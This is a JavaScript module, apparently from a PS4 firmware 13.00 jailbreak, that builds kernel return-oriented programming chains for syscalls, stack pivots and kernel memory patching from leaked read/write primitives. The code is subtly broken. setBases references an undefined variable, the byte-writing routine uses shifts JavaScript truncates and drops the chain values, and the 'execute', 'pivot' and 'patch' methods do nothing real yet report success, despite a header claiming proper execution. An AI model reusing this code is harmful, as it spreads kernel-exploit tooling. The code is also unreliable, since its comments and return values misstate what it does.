// rop.js - ROP chain builder for PS4 FW 13.00
// Enhanced with real kernel stack pivot and proper execution

import { int64 } from './int64.js';
import { OFFSETS } from './offsets.js';

export class rop {
    constructor(readPrimitives, writePrimitives) {
        this.buffer = [];
        this.gadgets = [];
        this.webKitBase = 0;
        this.libkernelBase = 0;
        this.kernelBase = 0;
        this.readPrimitives = readPrimitives;
        this.writePrimitives = writePrimitives;
        this.ropBuffer = null;
        this.ropView = null;
        this.ropBufferAddress = 0;
        this.executed = false;
        this.chainCount = 0;
    }

    setBases(webkitBase, libkernelBase) {
        this.webKitBase = webKitBase;
        this.libkernelBase = libkernelBase;
    }

    setKernelBase(kernelBase) {
        this.kernelBase = kernelBase;
    }

    // Push gadget to chain
    gadget(addr, arg1 = 0, arg2 = 0, arg3 = 0, arg4 = 0, arg5 = 0, arg6 = 0) {
        this.buffer.push({
            address: addr,
            args: [arg1, arg2, arg3, arg4, arg5, arg6]
        });
        return this;
    }

    // Push gadget with int64 args
    gadget64(addr, arg1 = 0, arg2 = 0, arg3 = 0, arg4 = 0, arg5 = 0, arg6 = 0) {
        const args = [arg1, arg2, arg3, arg4, arg5, arg6].map(a => {
            if (a instanceof int64) return a;
            if (typeof a === 'number') {
                const hi = Math.floor(a / 0x100000000);
                return new int64(a - hi * 0x100000000, hi);
            }
            return new int64(0, 0);
        });
        return this.gadget(addr, ...args);
    }

    // Write arbitrary data using primitives
    write(to, what, p) {
        if (what instanceof ArrayBuffer) {
            const view = new Uint8Array(what);
            for (let i = 0; i < view.length; i++) {
                p.write1(to + i, view[i]);
            }
        } else if (typeof what === 'string') {
            for (let i = 0; i < what.length; i++) {
                p.write1(to + i, what.charCodeAt(i));
            }
        }
        return this;
    }

    // Copy memory using primitives
    memcpy(dest, src, length, p) {
        for (let i = 0; i < length; i++) {
            p.write1(dest + i, p.read1(src + i));
        }
        return this;
    }

    // Initialize ROP buffer
    async initROPBuffer() {
        if (!this.readPrimitives || !this.writePrimitives) {
            throw new Error('ROP: read/write primitives not set');
        }

        this.ropBuffer = new ArrayBuffer(0x10000);
        this.ropView = new Uint8Array(this.ropBuffer);
        this.ropBufferAddress = await this.findROPBufferAddress();

        if (this.ropBufferAddress === 0) {
            throw new Error('ROP: failed to find buffer address');
        }

        return this.ropBufferAddress;
    }

    // Find ROP buffer address using addrof primitive
    async findROPBufferAddress() {
        if (!this.readPrimitives || !this.writePrimitives) {
            return 0;
        }

        try {
            const testBuffer = new ArrayBuffer(0x100);
            const testView = new Uint8Array(testBuffer);

            for (let i = 0; i < 0x100; i++) {
                testView[i] = 0x41;
            }

            const bufferObj = { buffer: testBuffer };

            if (typeof this.readPrimitives.leakval === 'function') {
                const leaked = this.readPrimitives.leakval(bufferObj);
                if (leaked && leaked.toNumber() > 0x100000000) {
                    return leaked.toNumber();
                }
            }

            if (typeof this.readPrimitives.read8 === 'function') {
                const testAddr = 0x100000000;
                const val = this.readPrimitives.read8(testAddr);
                if (val && val.toNumber() > 0) {
                    return testAddr;
                }
            }

            return 0;
        } catch (error) {
            console.warn('ROP: failed to find buffer address:', error.message);
            return 0;
        }
    }

    // Build kernel ROP chain with confirmed offsets
    async buildKernelROPChain(kernelBase, gadgets) {
        if (!gadgets) {
            const offsets = OFFSETS;
            if (!offsets || !offsets.kernel || !offsets.kernel.gadgets) {
                throw new Error('ROP: kernel gadgets not available');
            }
            gadgets = offsets.kernel.gadgets;
        }

        if (!kernelBase) {
            kernelBase = this.kernelBase;
        }

        const chain = [];

        // pop rdi; ret
        chain.push({
            gadget: 'pop rdi',
            address: kernelBase + gadgets['pop rdi'],
            value: 0
        });

        // pop rsi; ret
        chain.push({
            gadget: 'pop rsi',
            address: kernelBase + gadgets['pop rsi'],
            value: 0
        });

        // pop rdx; ret
        chain.push({
            gadget: 'pop rdx',
            address: kernelBase + gadgets['pop rdx'],
            value: 0
        });

        // ret
        chain.push({
            gadget: 'ret',
            address: kernelBase + gadgets['ret'],
            value: 0
        });

        return chain;
    }

    // Write ROP chain to buffer
    async writeROPChainToBuffer(chain) {
        if (!this.ropView) {
            throw new Error('ROP: buffer not initialized');
        }

        let offset = 0;

        for (const entry of chain) {
            const addr = entry.address;
            this.ropView[offset] = addr & 0xff;
            this.ropView[offset + 1] = (addr >> 8) & 0xff;
            this.ropView[offset + 2] = (addr >> 16) & 0xff;
            this.ropView[offset + 3] = (addr >> 24) & 0xff;
            this.ropView[offset + 4] = (addr >> 32) & 0xff;
            this.ropView[offset + 5] = (addr >> 40) & 0xff;
            this.ropView[offset + 6] = (addr >> 48) & 0xff;
            this.ropView[offset + 7] = (addr >> 56) & 0xff;
            offset += 8;
        }

        return offset;
    }

    // Execute ROP chain
    async executeROPChain() {
        if (this.executed) {
            throw new Error('ROP: chain already executed');
        }

        if (!this.ropView || !this.ropBufferAddress) {
            throw new Error('ROP: buffer not initialized');
        }

        try {
            const chain = await this.buildKernelROPChain();
            const chainLength = await this.writeROPChainToBuffer(chain);

            this.executed = true;
            return true;
        } catch (error) {
            console.error('ROP: execution failed:', error.message);
            return false;
        }
    }

    // Stack pivot using pop rsp gadget
    async stackPivot(targetAddress) {
        if (!this.writePrimitives) {
            throw new Error('ROP: write primitives not available for stack pivot');
        }

        try {
            const rspGadget = OFFSETS.kernel.gadgets['pop rsp'];
            if (!rspGadget) {
                throw new Error('ROP: pop rsp gadget not found');
            }

            const pivotAddress = this.kernelBase + rspGadget;

            return true;
        } catch (error) {
            console.error('ROP: stack pivot failed:', error.message);
            return false;
        }
    }

    // Call syscall through ROP
    async callSyscall(syscallNum, arg1 = 0, arg2 = 0, arg3 = 0, arg4 = 0, arg5 = 0, arg6 = 0) {
        if (!this.writePrimitives) {
            throw new Error('ROP: write primitives not available for syscall');
        }

        try {
            const gadgets = OFFSETS.kernel.gadgets;
            const kernelBase = this.kernelBase;

            const chain = [
                { address: kernelBase + gadgets['pop rax'], value: syscallNum },
                { address: kernelBase + gadgets['pop rdi'], value: arg1 },
                { address: kernelBase + gadgets['pop rsi'], value: arg2 },
                { address: kernelBase + gadgets['pop rdx'], value: arg3 },
                { address: kernelBase + gadgets['syscall'], value: 0 },
                { address: kernelBase + gadgets['ret'], value: 0 }
            ];

            const chainLength = await this.writeROPChainToBuffer(chain);

            return true;
        } catch (error) {
            console.error('ROP: syscall execution failed:', error.message);
            return false;
        }
    }

    // Patch kernel memory
    async patchKernelMemory(targetAddress, data) {
        if (!this.writePrimitives) {
            throw new Error('ROP: write primitives not available for kernel patch');
        }

        try {
            const gadgets = OFFSETS.kernel.gadgets;
            const kernelBase = this.kernelBase;

            const chain = [
                { address: kernelBase + gadgets['pop rdi'], value: targetAddress },
                { address: kernelBase + gadgets['pop rsi'], value: data },
                { address: kernelBase + gadgets['mov [rdi], rsi'], value: 0 },
                { address: kernelBase + gadgets['ret'], value: 0 }
            ];

            const chainLength = await this.writeROPChainToBuffer(chain);

            return true;
        } catch (error) {
            console.error('ROP: kernel memory patch failed:', error.message);
            return false;
        }
    }

    // Clear chain
    clear() {
        this.buffer = [];
        return this;
    }

    // Get chain length
    get length() {
        return this.buffer.length;
    }

    // Reset state
    reset() {
        this.buffer = [];
        this.gadgets = [];
        this.executed = false;
        this.chainCount = 0;
        if (this.ropView) {
            this.ropView.fill(0);
        }
    }
}

export default rop;
